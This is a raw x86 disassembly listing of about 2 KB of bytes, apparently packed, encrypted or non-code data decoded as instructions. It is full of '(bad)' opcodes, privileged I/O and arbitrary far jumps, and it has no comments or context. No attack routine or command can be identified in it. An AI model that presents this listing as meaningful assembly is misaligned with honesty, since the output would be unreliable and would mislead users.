  4194d5:	sbb    BYTE PTR [ecx+0x1d],cl
  4194d8:	nop
  4194d9:	addr16 pushf 
  4194db:	push   edx
  4194dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194dd:	push   ss
  4194de:	bound  eax,QWORD PTR [ecx-0x5f]
  4194e1:	sbb    DWORD PTR [ecx],edx
  4194e3:	mov    ebp,cs
  4194e5:	push   es
  4194e6:	outs   dx,DWORD PTR ds:[si]
  4194e8:	sub    BYTE PTR [ebx+0x59],0xc9
  4194ec:	(bad)  
  4194ee:	add    dl,BYTE PTR [esi]
  4194f0:	je     0x419473
  4194f2:	jns    0x419554
  4194f4:	sbb    ch,BYTE PTR [ecx+0x3f7bd26b]
  4194fa:	shl    DWORD PTR [ecx],1
  4194fc:	push   ebp
  4194fd:	ja     0x419527
  4194ff:	sub    al,0x78
  419501:	rcl    BYTE PTR [ebx-0x19],cl
  419504:	sbb    al,bl
  419506:	xchg   ecx,eax
  419507:	not    DWORD PTR [edi+0x6f5ea8e1]
  41950d:	sbb    bh,0xb5
  419510:	adc    DWORD PTR [ebx],edx
  419512:	xor    al,0x95
  419514:	push   0x1
  419516:	les    edx,FWORD PTR [ecx]
  419518:	ins    DWORD PTR es:[edi],dx
  419519:	xlat   BYTE PTR ds:[ebx]
  41951a:	sti    
  41951b:	or     al,0x19
  41951d:	cdq    
  41951e:	xlat   BYTE PTR ds:[ebx]
  41951f:	mov    BYTE PTR [esi-0x78d34f5f],bh
  419525:	lahf   
  419526:	pop    ebx
  419527:	imul   ebp,DWORD PTR [ebx-0x6c],0xffffff83
  41952b:	shl    BYTE PTR [ebx-0xb],1
  41952e:	retf   0x3ce5
  419531:	dec    esi
  419532:	mov    bl,0x4c
  419534:	xor    al,0x38
  419536:	mov    ds:0xc86811c7,al
  41953b:	xor    dl,bl
  41953d:	push   0xd1c6bdec
  419542:	push   ds
  419543:	xchg   DWORD PTR [esi],ebx
  419545:	loope  0x4194e7
  419547:	repnz pop es
  419549:	enter  0xf60e,0xf
  41954d:	and    DWORD PTR [edi+0x581b6d72],ebx
  419553:	push   edx
  419554:	ja     0x4195bf
  419556:	neg    BYTE PTR [ecx+ebp*1-0x48]
  41955a:	mov    bh,ah
  41955c:	or     ah,ah
  41955e:	jbe    0x419505
  419560:	mov    ah,0x48
  419562:	inc    esp
  419563:	add    eax,0xf5d0331d
  419568:	cmp    BYTE PTR [esi+0x7f],cl
  41956b:	mov    edi,ds
  41956d:	push   ebp
  41956e:	(bad)
  419572:	xchg   ecx,eax
  419573:	fist   DWORD PTR [ecx+0x40]
  419576:	add    al,0xbe
  419578:	fcom   QWORD PTR [esi-0x13]
  41957b:	push   ebp
  41957c:	fdivr  DWORD PTR [ecx-0x376e0633]
  419582:	sub    DWORD PTR ds:0xb08efb24,0x3c1aeda2
  41958c:	and    DWORD PTR [eax+edi*4],esp
  41958f:	adc    DWORD PTR [eax-0x62cc86d2],0x66b7c770
  419599:	call   0x5b933790
  41959e:	cmp    BYTE PTR [edi-0x136799fa],dl
  4195a4:	adc    BYTE PTR [ecx+0x7],ch
  4195a7:	les    ecx,FWORD PTR [ecx-0x30]
  4195aa:	out    dx,al
  4195ab:	outs   dx,BYTE PTR ds:[esi]
  4195ac:	outs   dx,DWORD PTR ds:[esi]
  4195ad:	sbb    BYTE PTR [ebp+0x79],0x1e
  4195b1:	sbb    eax,0x56088ab6
  4195b6:	xor    BYTE PTR [ecx],dl
  4195b8:	and    edi,esp
  4195ba:	popf   
  4195bb:	push   esp
  4195bc:	pop    ebx
  4195bd:	and    al,0x94
  4195bf:	mov    edi,0x32ca8812
  4195c4:	in     eax,0x1e
  4195c6:	inc    edx
  4195c7:	loop   0x4195b4
  4195c9:	inc    edx
  4195ca:	mov    ebp,0xb5d41db6
  4195cf:	aas    
  4195d0:	cmp    eax,0xff84ee10
  4195d5:	shl    BYTE PTR [eax-0x626640f0],0x5c
  4195dc:	mov    al,BYTE PTR [edi-0x64]
  4195df:	inc    esp
  4195e0:	pop    ds
  4195e1:	or     BYTE PTR [ebx-0x60858bd1],0xda
  4195e8:	mov    BYTE PTR [ecx-0x3f],dh
  4195eb:	and    BYTE PTR [edx-0x25],dh
  4195ee:	pop    edi
  4195ef:	fbld   TBYTE PTR [ebp-0x20]
  4195f2:	add    DWORD PTR [ebp-0x71999e34],esi
  4195f8:	mov    DWORD PTR [edx],edx
  4195fa:	out    0xa0,al
  4195fc:	loop   0x4195fc
  4195fe:	bsf    esp,DWORD PTR [eax+0x74]
  419602:	jo     0x41958c
  419604:	dec    edi
  419605:	adc    ah,BYTE PTR [ebx+0x66]
  419608:	mov    ch,0xec
  41960a:	cld    
  41960b:	das    
  41960c:	push   es
  41960d:	cmp    esi,edx
  41960f:	outs   dx,DWORD PTR ds:[esi]
  419610:	sahf   
  419611:	xchg   ebp,eax
  419612:	inc    esi
  419613:	cmp    al,BYTE PTR [edi+0x28]
  419616:	adc    al,ch
  419618:	jmp    0xd639:0xa8982d16
  41961f:	(bad)  
  419621:	pop    fs
  419623:	retf   0x3414
  419626:	inc    esi
  419627:	jne    0x4195aa
  419629:	retf   
  41962a:	add    al,0xb3
  41962c:	test   BYTE PTR [eax],0x2f
  41962f:	xchg   ebp,eax
  419630:	dec    ebp
  419631:	pushf  
  419632:	add    ecx,DWORD PTR ds:0x78a42230
  419638:	inc    ebx
  419639:	outs   dx,BYTE PTR ds:[esi]
  41963a:	mov    ds:0xfcf06c61,eax
  41963f:	jnp    0x419684
  419641:	sbb    al,0xa0
  419643:	push   edi
  419644:	cmp    eax,0xda3588fb
  419649:	ret    0xabd0
  41964c:	dec    ebx
  41964d:	xor    DWORD PTR [eax-0xd34da73],0xfbbed6a0
  419657:	into   
  419658:	xor    esi,ebx
  41965a:	pusha  
  41965b:	push   ds
  41965c:	mov    edi,0xed5835d1
  419661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419662:	leave  
  419663:	add    al,0xd
  419665:	stos   BYTE PTR es:[edi],al
  419666:	aam    0x2
  419668:	mov    dh,0xf9
  41966a:	in     eax,0x34
  41966c:	add    al,0xfd
  41966e:	xor    BYTE PTR [ebp+0x4ac12f78],ch
  419674:	out    0xf4,eax
  419676:	arpl   WORD PTR [esi],cx
  419678:	pop    ebx
  419679:	imul   esp,DWORD PTR [ebp-0x58],0x43
  41967d:	ins    BYTE PTR es:[edi],dx
  41967e:	jmp    DWORD PTR [edi]
  419680:	mov    cl,0x1c
  419682:	retf   0xa180
  419685:	lahf   
  419686:	scas   eax,DWORD PTR es:[edi]
  419687:	sar    DWORD PTR [ebp+0x54],0x4e
  41968b:	mov    ?,WORD PTR [ebx+0x5b30330c]
  419691:	out    dx,al
  419692:	pop    ds
  419693:	aas    
  419694:	in     eax,0x10
  419696:	repnz mov esi,0x27e8bf34
  41969c:	neg    bl
  41969e:	bound  ecx,QWORD PTR [eax*8-0x56e53f04]
  4196a5:	cmp    eax,0x15d24525
  4196aa:	cmp    DWORD PTR [eax-0x35],0x5b
  4196ae:	in     al,dx
  4196af:	adc    al,0x8e
  4196b1:	adc    BYTE PTR [eax+0x40],dh
  4196b4:	call   DWORD PTR [edi]
  4196b6:	pop    es
  4196b7:	xchg   esi,eax
  4196b8:	dec    ecx
  4196b9:	cwde   
  4196ba:	icebp  
  4196bb:	mov    esp,0xb0e6de7e
  4196c0:	or     bh,BYTE PTR [esi+0x60]
  4196c3:	push   ss
  4196c4:	std    
  4196c5:	sub    al,0xbb
  4196c7:	iret   
  4196c8:	push   ebx
  4196c9:	dec    esp
  4196ca:	popa   
  4196cb:	int    0xdf
  4196cd:	dec    eax
  4196ce:	xchg   esi,eax
  4196cf:	mov    edx,0x512d30d8
  4196d4:	push   ds
  4196d5:	or     ch,BYTE PTR [edi-0x55c0911a]
  4196db:	nop
  4196dc:	inc    ebx
  4196dd:	push   ecx
  4196de:	das    
  4196df:	and    DWORD PTR [ecx*2+0x7d3db018],ebp
  4196e6:	ja     0x4196c9
  4196e8:	out    0x1d,al
  4196ea:	add    al,0x53
  4196ec:	(bad)  
  4196ed:	cli    
  4196ee:	or     eax,0x580b6588
  4196f3:	(bad)
  4196f6:	xchg   ebx,eax
  4196f7:	xor    al,0x6d
  4196f9:	sub    eax,0xf92be480
  4196fe:	mov    ds:0xf3827dc2,eax
  419703:	pop    ebp
  419704:	pop    esi
  419705:	inc    ebp
  419706:	push   esi
  419707:	mov    esi,0xb6d33b68
  41970c:	mov    ecx,0x8cecad89
  419711:	lock mov ds:0xc06c38f2,al
  419717:	push   ebx
  419718:	push   edx
  419719:	push   es
  41971a:	xchg   ecx,eax
  41971b:	dec    ecx
  41971c:	iret   
  41971d:	mov    eax,0xf4443e8b
  419722:	(bad)  
  419723:	sub    al,0xc5
  419725:	mov    bh,0x24
  419727:	xor    DWORD PTR [esi+0x134c5044],0x1484bdc3
  419731:	shl    DWORD PTR [ebx],0x7d
  419734:	sahf   
  419735:	dec    eax
  419736:	pop    ss
  419737:	jmp    0xd9a0:0x20461854
  41973e:	xchg   ecx,eax
  41973f:	add    BYTE PTR [esi],bh
  419741:	push   esp
  419742:	clc    
  419743:	stos   BYTE PTR es:[edi],al
  419744:	or     edi,DWORD PTR [esi+0x1c0d9878]
  41974a:	jno    0x41970f
  41974c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41974d:	fisubr DWORD PTR [esi]
  41974f:	sbb    DWORD PTR [ebp+0x17118c83],eax
  419755:	xchg   BYTE PTR [edx],ch
  419757:	jns    0x419718
  419759:	std    
  41975a:	cmp    cl,bh
  41975c:	push   esp
  41975d:	addr16 pop esi
  41975f:	cmp    ebx,0x6cdb4408
  419765:	inc    edi
  419766:	out    dx,al
  419767:	jae    0x41977c
  419769:	out    0x1c,eax
  41976b:	mov    eax,ds:0xb8adf3f9
  419770:	cs sbb al,0xe0
  419773:	mov    ebp,0x77c51e99
  419778:	fs idiv cl
  41977b:	inc    ecx
  41977c:	mov    WORD PTR [eax+ebx*2],es
  41977f:	out    dx,al
  419780:	scas   eax,DWORD PTR es:[edi]
  419781:	dec    ebp
  419782:	int3   
  419783:	cmp    al,0x52
  419785:	arpl   WORD PTR ds:0xbdb7ba4e,bx
  41978b:	sub    DWORD PTR [edx-0x7429688d],esp
  419791:	mov    edi,0x5fb94b2a
  419796:	push   0xffffffb4
  419798:	dec    edi
  419799:	sbb    bh,BYTE PTR [esi-0x4a]
  41979c:	xor    esp,DWORD PTR [ecx+0x35593633]
  4197a2:	mov    ch,0xeb
  4197a4:	inc    ebx
  4197a5:	inc    esi
  4197a6:	cmc    
  4197a7:	icebp  
  4197a8:	retf   
  4197a9:	sub    DWORD PTR [ebp+ebp*1-0x55e42bcf],ebp
  4197b0:	outs   dx,DWORD PTR ds:[esi]
  4197b1:	mov    ebx,0x88035389
  4197b6:	outs   dx,BYTE PTR ds:[esi]
  4197b7:	xor    eax,0x3ad971b9
  4197bc:	loop   0x4197f8
  4197be:	outs   dx,DWORD PTR ds:[esi]
  4197bf:	fst    DWORD PTR [edx]
  4197c1:	push   ds
  4197c2:	mov    ss,WORD PTR [esi-0x1cbdb247]
  4197c8:	push   0xffffffc6
  4197ca:	or     ch,dh
  4197cc:	inc    ebp
  4197cd:	call   0x550f:0x1583dfe0
  4197d4:	daa    
  4197d5:	pop    ss
  4197d6:	popa   
  4197d7:	pop    ecx
  4197d8:	cmp    eax,DWORD PTR [ebx]
  4197da:	push   ebp
  4197db:	cmp    eax,0x9097267c
  4197e0:	cmp    eax,0x20e2e521
  4197e5:	in     eax,dx
  4197e6:	pop    ds
  4197e7:	scas   al,BYTE PTR es:[edi]
  4197e8:	outs   dx,DWORD PTR ds:[esi]
  4197e9:	xchg   edx,eax
  4197ea:	shr    al,0xad
  4197ed:	pop    ecx
  4197ee:	imul   BYTE PTR [eax+0x4e]
  4197f1:	dec    esi
  4197f2:	xchg   esp,esi
  4197f4:	icebp  
  4197f5:	aad    0xc
  4197f7:	adc    DWORD PTR [edx],0xa0a83c77
  4197fd:	dec    edx
  4197fe:	pusha  
  4197ff:	sbb    eax,0x947a26bd
  419804:	mov    BYTE PTR [edi-0x9],cl
  419807:	es test dl,ch
  41980a:	push   esi
  41980b:	je     0x419878
  41980d:	cld    
  41980e:	les    ecx,FWORD PTR [ecx]
  419810:	fld    DWORD PTR fs:[esi-0x4c]
  419814:	dec    esp
  419815:	add    bh,BYTE PTR [esi-0x42]
  419818:	outs   dx,BYTE PTR ds:[esi]
  419819:	inc    esi
  41981a:	mov    esp,0xeae2206f
  41981f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419820:	retf   
  419821:	sub    al,0x98
  419823:	adc    bh,ch
  419825:	xchg   ecx,eax
  419826:	xchg   ebp,eax
  419827:	jle    0x41987c
  419829:	or     al,0xb8
  41982b:	or     DWORD PTR [ebx+edx*1-0x76],0x20
  419830:	sub    ebx,DWORD PTR [ecx-0x1]
  419833:	bound  eax,QWORD PTR [eax]
  419835:	fisttp QWORD PTR [ebp+0x38631483]
  41983b:	push   ss
  41983c:	rcl    ecx,cl
  41983e:	cmp    al,0x69
  419840:	fild   QWORD PTR [ebx]
  419842:	leave  
  419843:	(bad)  
  419844:	mov    dl,0x6d
  419846:	(bad)
  419849:	fld    TBYTE PTR [ebx-0x702290e8]
  41984f:	sub    dh,dh
  419851:	jae    0x41984c
  419853:	mov    DWORD PTR [edx+0x2ff4cb78],esi
  419859:	pop    ss
  41985a:	test   BYTE PTR [esi-0x10cd700],al
  419860:	stos   BYTE PTR es:[edi],al
  419861:	aaa    
  419862:	inc    esp
  419863:	and    BYTE PTR [eax-0x31],bh
  419866:	add    ecx,esp
  419868:	ins    BYTE PTR es:[edi],dx
  419869:	in     al,dx
  41986a:	push   0x78
  41986c:	cmp    DWORD PTR [edx],esp
  41986e:	lock mov eax,DWORD PTR [esi+0x1e69280a]
  419875:	fs xchg ecx,eax
  419877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419878:	cmp    dh,0x89
  41987b:	je     0x4198b8
  41987d:	mov    bl,0xe7
  41987f:	sub    dh,BYTE PTR [eax+ecx*4]
  419882:	(bad)  
  419883:	pop    edx
  419884:	hlt    
  419885:	test   eax,0x7cdd97e7
  41988a:	sub    esi,DWORD PTR cs:[edi-0x1ea085bc]
  419891:	jp     0x419829
  419893:	jb     0x4198c6
  419895:	add    ah,BYTE PTR [eax-0x22c80029]
  41989b:	imul   DWORD PTR [eax+0x16]
  41989e:	sbb    ebx,ecx
  4198a0:	jecxz  0x419872
  4198a2:	mov    ebp,0x8ed34688
  4198a7:	outs   dx,DWORD PTR ds:[esi]
  4198a8:	or     bl,BYTE PTR [edx-0xd7788f1]
  4198ae:	sbb    BYTE PTR [esi+0x3bd4daa8],ch
  4198b4:	sub    esi,ebx
  4198b6:	push   esp
  4198b7:	adc    dl,cl
  4198b9:	stos   BYTE PTR es:[edi],al
  4198ba:	mov    dl,0xb9
  4198bc:	cdq    
  4198bd:	aam    0x33
  4198bf:	jns    0x419914
  4198c1:	fcomp  QWORD PTR [ebx]
  4198c3:	xchg   edi,eax
  4198c4:	jl     0x41985d
  4198c6:	call   0x69a7132d
  4198cb:	enter  0x1f55,0x3a
  4198cf:	clc    
  4198d0:	fimul  DWORD PTR es:[ecx+0x2a]
  4198d4:	mov    dl,0x28
  4198d6:	das    
  4198d7:	push   esi
  4198d8:	das    
  4198d9:	test   BYTE PTR [edx],0xd9
  4198dc:	mov    dl,0xeb
  4198de:	div    BYTE PTR [esi-0x62]
  4198e1:	stos   DWORD PTR es:[edi],eax
  4198e2:	mov    al,0x86
  4198e4:	add    al,0x8b
  4198e6:	pop    ecx
  4198e7:	ds cld 
  4198e9:	sub    al,0x1f
  4198eb:	ret    
  4198ec:	mov    dl,0x16
  4198ee:	jae    0x4198b3
  4198f0:	mov    edx,DWORD PTR [ebx+0x42]
  4198f3:	test   BYTE PTR [esi],bl
  4198f5:	lea    ebx,[eax+0x72d1da32]
  4198fb:	in     al,dx
  4198fc:	mov    dl,0x4f
  4198fe:	test   al,0xe8
  419900:	iret   
  419901:	rcr    BYTE PTR [eax+0x4f],0x82
  419905:	mov    bl,0xbe
  419907:	push   edi
  419908:	mov    fs,WORD PTR [eax]
  41990a:	xchg   ecx,eax
  41990b:	xchg   edx,eax
  41990c:	xchg   esi,eax
  41990d:	add    ebp,eax
  41990f:	je     0x4198c5
  419911:	inc    edx
  419912:	repz inc ebx
  419914:	je     0x419979
  419916:	rcr    DWORD PTR [esp+esi*8-0xd],cl
  41991a:	push   ebp
  41991b:	(bad)  
  41991c:	ror    BYTE PTR [edi],1
  41991e:	adc    esp,DWORD PTR [esp+esi*2+0x42352ff5]
  419925:	stos   DWORD PTR es:[edi],eax
  419926:	mov    ecx,0xdf957155
  41992b:	xchg   ebx,eax
  41992c:	mov    eax,0x5acb029e
  419931:	retf   
  419932:	mov    DWORD PTR [edx+0x6a],esi
  419935:	mov    esp,0xc0394db8
  41993a:	div    dh
  41993c:	mov    eax,cs
  41993e:	inc    esi
  41993f:	enter  0x4b69,0xde
  419943:	test   DWORD PTR [esi-0x36],ebp
  419946:	ss cli 
  419948:	sbb    esp,DWORD PTR [di-0x31]
  41994c:	push   0xffffffaf
  41994e:	aam    0x2e
  419950:	cmp    BYTE PTR [edi],ch
  419952:	enter  0xbdc2,0x92
  419956:	inc    eax
  419957:	push   0x78
  419959:	xchg   edx,eax
  41995a:	js     0x4198e0
  41995c:	xchg   ebx,eax
  41995d:	jecxz  0x419994
  41995f:	(bad)  
  419960:	pop    ebp
  419961:	data16 scas al,BYTE PTR es:[edi]
  419963:	jge    0x419952
  419965:	hlt    
  419966:	mov    dl,0x90
  419968:	push   ds
  419969:	sub    bl,ah
  41996b:	push   es
  41996c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41996d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41996e:	mov    eax,ds:0x9170d5f7
  419973:	popf   
  419974:	ins    BYTE PTR es:[edi],dx
  419975:	jle    0x41990f
  419977:	fisttp WORD PTR ds:[ecx+esi*8-0x528265dc]
  41997f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419980:	scas   al,BYTE PTR es:[edi]
  419981:	fnstenv [ecx+ebx*1+0x4f]
  419985:	inc    ecx
  419986:	cmp    ebp,DWORD PTR [eax+ebx*4+0x5220bc3f]
  41998d:	pop    esi
  41998e:	neg    DWORD PTR [ecx]
  419990:	inc    eax
  419991:	dec    eax
  419992:	fldenv [eax-0x5a49c37d]
  419998:	sub    DWORD PTR [ecx-0x27],ebx
  41999b:	lods   eax,DWORD PTR ds:[esi]
  41999c:	fucompp 
  41999e:	dec    ebx
  41999f:	dec    esp
  4199a0:	sar    BYTE PTR [eax+0x4b5e20eb],0x89
  4199a7:	adc    eax,0xbd39d788
  4199ac:	push   eax
  4199ad:	cwde   
  4199ae:	mov    eax,0xfd889c13
  4199b3:	(bad)  
  4199b4:	push   edi
  4199b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199b6:	mov    ch,0xcd
  4199b8:	jne    0x419a24
  4199ba:	(bad)  
  4199bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199bc:	std    
  4199bd:	mov    dl,0x27
  4199bf:	xchg   ebp,eax
  4199c0:	jo     0x4199bc
  4199c2:	sbb    ecx,esi
  4199c4:	call   0xee18:0xa0be3122
  4199cb:	and    DWORD PTR [ecx-0x33],ecx
  4199ce:	stos   BYTE PTR es:[edi],al
  4199cf:	push   edx
  4199d0:	mov    esi,0x82035f95
  4199d5:	mov    edx,0x950fe05d
  4199da:	xor    ch,ah
  4199dc:	fild   WORD PTR [esi-0x3253e688]
  4199e2:	lods   al,BYTE PTR ds:[esi]
  4199e3:	xchg   ecx,eax
  4199e4:	push   0xe6c98651
  4199e9:	ret    
  4199ea:	adc    dl,BYTE PTR [ecx]
  4199ec:	xor    al,0x6c
  4199ee:	mov    ch,BYTE PTR [ebx+0x3fc6ab79]
  4199f4:	ret    
  4199f5:	ror    BYTE PTR [ecx-0x16],1
  4199f8:	in     al,0x48
  4199fa:	push   ds
  4199fb:	push   es
  4199fc:	pop    esp
  4199fd:	repz adc BYTE PTR [ebx+0x38],bh
  419a01:	in     al,0x20
  419a03:	(bad)  
  419a04:	aam    0x69
  419a06:	ins    BYTE PTR es:[edi],dx
  419a07:	test   DWORD PTR [ecx-0x42ea1567],esi
  419a0d:	pop    edx
  419a0e:	std    
  419a0f:	pop    esi
  419a10:	mov    ds:0xc130f349,eax
  419a15:	rcl    ebp,0x1c
  419a18:	push   esp
  419a19:	cmp    bl,BYTE PTR [ecx-0x4a515e4a]
  419a1f:	fistp  DWORD PTR [eax]
  419a21:	fidiv  WORD PTR [edi+0x47]
  419a24:	(bad)  
  419a25:	adc    BYTE PTR ds:0x4a1becc3,cl
  419a2b:	mov    ebp,0x4bf0499
  419a30:	sbb    al,0xce
  419a32:	int    0x69
  419a34:	mov    esi,0xfe478d50
  419a39:	sti    
  419a3a:	cmp    al,bl
  419a3c:	aam    0x7c
  419a3e:	xlat   BYTE PTR ds:[ebx]
  419a3f:	xor    BYTE PTR [edx-0x4a],dl
  419a42:	and    eax,0x1ad1bc2e
  419a47:	pop    esp
  419a48:	push   eax
  419a49:	dec    esi
  419a4a:	pop    edi
  419a4b:	push   cs
  419a4c:	jb     0x4199e7
  419a4e:	daa    
  419a4f:	jae    0x419ac6
  419a51:	int3   
  419a52:	repnz xor eax,0xcf0d2ede
  419a58:	lock sub DWORD PTR ds:0x1b55543c,edi
  419a5f:	bound  edx,QWORD PTR [edx-0x3aaef9fc]
  419a65:	pop    esp
  419a66:	inc    esp
  419a67:	into   
  419a68:	aam    0x96
  419a6a:	dec    ebx
  419a6b:	cs jno 0x419a7c
  419a6e:	push   ecx
  419a6f:	add    ebx,DWORD PTR [ebx]
  419a71:	test   DWORD PTR [ebx+0x49],edi
  419a74:	xor    al,0xda
  419a76:	pop    esp
  419a77:	cmp    al,0x75
  419a79:	std    
  419a7a:	pop    edx
  419a7b:	xchg   esi,eax
  419a7c:	pop    ss
  419a7d:	imul   si,WORD PTR [edi-0x7a],0x37
  419a82:	or     al,0xd2
  419a84:	setb   BYTE PTR [eax-0x3c]
  419a88:	pop    ecx
  419a89:	inc    esp
  419a8a:	jp     0x419ac4
  419a8c:	mov    esp,0xc5e94592
  419a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a92:	bnd ja 0x419ad6
  419a95:	sbb    ebx,edi
  419a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a98:	mov    cl,0x60
  419a9a:	cdq    
  419a9b:	and    esi,esp
  419a9d:	rol    BYTE PTR [edx+ebx*4+0x5db1de0e],0xb8
  419aa5:	aas    
  419aa6:	rol    ebx,0xbb
  419aa9:	dec    edx
  419aaa:	add    al,0xcb
  419aac:	fdiv   QWORD PTR [ebp+0x30]
  419aaf:	xor    bh,bh
  419ab1:	cli    
  419ab2:	les    esp,FWORD PTR [ebp+0x5b]
  419ab5:	repz cmovg eax,esi
  419ab9:	dec    esi
  419aba:	cdq    
  419abb:	ds retf 0xbf40
  419abf:	jns    0x419a70
  419ac1:	fadd   DWORD PTR ds:0x85a57d33
  419ac7:	jg     0x419aa9
  419ac9:	or     BYTE PTR [edi+0x58],ch
  419acc:	call   0xd7c8930b
  419ad1:	add    al,0x51
  419ad3:	and    al,0x52
  419ad5:	mov    bh,0xba
  419ad7:	add    cl,BYTE PTR [esi-0x5229c49f]
  419add:	sub    DWORD PTR [edx-0x133a8e9a],ebx
  419ae3:	out    dx,eax
  419ae4:	(bad)  
  419ae5:	call   0x479a46b5
  419aea:	je     0x419b19
  419aec:	jmp    esi
  419aee:	(bad)  
  419aef:	or     DWORD PTR [ebp+0x2d],eax
  419af2:	fwait
  419af3:	mov    ebx,0x71079ece
  419af8:	adc    DWORD PTR [eax],edx
  419afa:	dec    ebp
  419afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419afc:	hlt    
  419afd:	jp     0x419ae0
  419aff:	xchg   esi,eax
  419b00:	xor    BYTE PTR [esp+ecx*2-0x3349a7d5],ch
  419b07:	mov    ecx,0xdfcebf07
  419b0c:	xor    al,BYTE PTR [esi-0x1a39b069]
  419b12:	loop   0x419b60
  419b14:	fist   DWORD PTR [esp+ecx*1]
  419b17:	(bad)  
  419b18:	out    0x1a,al
  419b1a:	mov    ebx,0x2f8bd95e
  419b1f:	adc    DWORD PTR [ecx+0x4aa78591],edx
  419b25:	aam    0xbf
  419b27:	add    DWORD PTR ds:0x84727ecc,esp
  419b2d:	aam    0x8
  419b2f:	test   DWORD PTR [ecx-0x25],ebx
  419b32:	sbb    cl,BYTE PTR [eax-0x49e8ccbc]
  419b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b39:	mov    bh,0xab
  419b3b:	sbb    dl,BYTE PTR [edx+eax*2+0x5ff56dc0]
  419b42:	test   al,0xc7
  419b44:	xchg   esi,eax
  419b45:	dec    ebp
  419b46:	faddp  st(5),st
  419b48:	es dec edi
  419b4a:	xchg   edx,eax
  419b4b:	out    0x72,al
  419b4d:	lods   al,BYTE PTR ds:[esi]
  419b4e:	inc    esi
  419b4f:	aas    
  419b50:	mov    ds:0xb5cef2c2,al
  419b55:	inc    ebx
  419b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b57:	fdivr  QWORD PTR [edi]
  419b59:	lods   al,BYTE PTR ds:[esi]
  419b5a:	stos   DWORD PTR es:[edi],eax
  419b5b:	pop    ebx
  419b5c:	lods   al,BYTE PTR ds:[esi]
  419b5d:	mov    dh,BYTE PTR [ebx]
  419b5f:	call   0xabcd9f9b
  419b64:	(bad)  
  419b65:	adc    al,0x85
  419b67:	xchg   esp,eax
  419b68:	xchg   esi,eax
  419b69:	and    eax,0x71bc1201
  419b6e:	dec    edi
  419b6f:	ja     0x419b06
  419b71:	or     DWORD PTR ds:0x44f9395c,ebx
  419b77:	mov    esi,0xa75a3054
  419b7c:	mov    ah,0x46
  419b7e:	aam    0xf9
  419b80:	push   ebx
  419b81:	mov    cl,0x36
  419b83:	adc    BYTE PTR [edi],ch
  419b85:	clc    
  419b86:	jmp    0xa0bc656e
  419b8b:	imul   ebp,DWORD PTR [ebx+0x9],0x45
  419b8f:	xchg   edx,eax
  419b90:	(bad)  
  419b91:	mov    ebx,?
  419b93:	pop    eax
  419b94:	or     ah,BYTE PTR [edi-0x1ba135d9]
  419b9a:	retf   
  419b9b:	inc    esi
  419b9c:	loope  0x419bdc
  419b9e:	push   0x297b3899
  419ba3:	xchg   BYTE PTR [edi],cl
  419ba5:	lock stos DWORD PTR es:[edi],eax
  419ba7:	fisttp QWORD PTR [eax-0x77cc2d88]
  419bad:	jmp    0xf020:0x475ed5c7
  419bb4:	xchg   esi,eax
  419bb5:	mov    edx,0xb9a45927
  419bba:	jb     0x419be7
  419bbc:	mov    esp,0xe31f51c3
  419bc1:	out    dx,eax
  419bc2:	lods   eax,DWORD PTR ds:[esi]
  419bc3:	jne    0x419b89
  419bc5:	scas   eax,DWORD PTR es:[edi]
  419bc6:	mov    esp,esp
  419bc8:	repz jmp 0x7ab5:0xe2c49b11
  419bd0:	push   ss
  419bd1:	sahf   
  419bd2:	jae    0x419c09
  419bd4:	push   ebp
  419bd5:	clc    
  419bd6:	adc    ebx,DWORD PTR [ebx+0x3c]
  419bd9:	pop    edi
  419bda:	sub    al,0xf6
  419bdc:	push   ecx
  419bdd:	stos   BYTE PTR es:[edi],al
  419bde:	test   DWORD PTR [edx],ebp
  419be0:	ss mov edi,0xc173f117
  419be6:	mov    bl,0xf3
  419be8:	jae    0x419bdc
  419bea:	and    eax,0x75d69d7d
  419bef:	in     eax,0xd5
  419bf1:	pop    ebx
  419bf2:	sti    
  419bf3:	push   0x70de8b3c
  419bf8:	lock cmp BYTE PTR [ecx+esi*4-0x19],ah
  419bfd:	xchg   esp,eax
  419bfe:	and    al,0x1e
  419c00:	call   0x1820:0xbd3ff534
  419c07:	aaa    
  419c08:	(bad)  
  419c09:	sbb    DWORD PTR [ebp-0x76],esp
  419c0c:	ds icebp 
  419c0e:	imul   esp,DWORD PTR [ecx],0xaf3e9d37
  419c14:	push   ebx
  419c15:	fwait
  419c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c17:	jmp    0x419c3a
  419c19:	movsx  edi,WORD PTR [ebp+0xb]
  419c1d:	xor    al,0xbd
  419c1f:	js     0x419c89
  419c21:	shr    BYTE PTR [eax+ebp*4+0x55],cl
  419c25:	jns    0x419bb1
  419c27:	sar    ah,cl
  419c29:	ficomp DWORD PTR [esi+ebx*1]
  419c2c:	ret    0x8832
  419c2f:	mov    DWORD PTR [esi],edi
  419c31:	lahf   
  419c32:	dec    edx
  419c33:	add    al,0xe3
  419c35:	sbb    al,0x74
  419c37:	in     eax,0xd0
  419c39:	shl    DWORD PTR [edi],0x7a
  419c3c:	stc    
  419c3d:	jae    0x419ca6
  419c3f:	lock dec edx
  419c41:	out    dx,eax
  419c42:	jp     0x419bf9
  419c44:	and    ah,0xa1
  419c47:	mov    cl,0x39
  419c49:	sub    edi,DWORD PTR [esi]
  419c4b:	mov    BYTE PTR [ecx+eiz*8+0x7fe549b2],0x99
  419c53:	lock clc 
  419c55:	out    0xb2,al
  419c57:	fs aam 0x89
  419c5a:	mov    al,ds:0x21de730a
  419c5f:	rcl    BYTE PTR [ecx-0x74],1
  419c62:	mov    cl,0xb5
  419c64:	jne    0x5fbcb7ee
  419c6a:	pop    ecx
  419c6c:	sub    al,0xf5
  419c6e:	jns    0x419cdb
